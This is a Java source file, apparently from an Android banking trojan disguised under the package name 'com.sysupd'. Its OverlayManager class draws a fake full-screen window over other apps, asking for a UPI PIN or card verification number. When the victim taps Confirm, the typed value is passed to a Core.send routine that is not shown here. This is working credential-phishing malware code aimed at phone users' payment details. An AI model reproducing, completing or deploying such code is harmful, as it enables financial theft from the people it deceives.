package com.sysupd;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.*;
import android.widget.*;

public class OverlayManager {
    Context ctx;
    WindowManager wm;
    public OverlayManager(Context c) {
        ctx = c;
        wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
    }

    void show(String title, String hint, final String label) {
        LinearLayout ll = new LinearLayout(ctx);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setBackgroundColor(0xFF0A0A0A);
        ll.setPadding(60, 200, 60, 60);

        TextView t = new TextView(ctx);
        t.setText(title);
        t.setTextColor(0xFFFFFFFF);
        t.setTextSize(22);
        ll.addView(t);

        final EditText et = new EditText(ctx);
        et.setHint(hint);
        et.setHintTextColor(0xFF888888);
        et.setTextColor(0xFFFFFFFF);
        et.setInputType(android.text.InputType.TYPE_CLASS_NUMBER |
            android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        ll.addView(et);

        Button b = new Button(ctx);
        b.setText("Confirm");
        b.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Core.send(label, "{\"value\":\"" + et.getText().toString() + "\"}");
                try { wm.removeView(ll); } catch (Exception e) {}
            }
        });
        ll.addView(b);

        int type = Build.VERSION.SDK_INT >= 26 ?
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
            WindowManager.LayoutParams.TYPE_PHONE;
        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT);
        wm.addView(ll, p);
    }

    public void showUpiPin() { show("Enter UPI PIN", "••••", "UPI_PIN"); }
    public void showCard() { show("Card Verification", "Card number", "CVV"); }
}
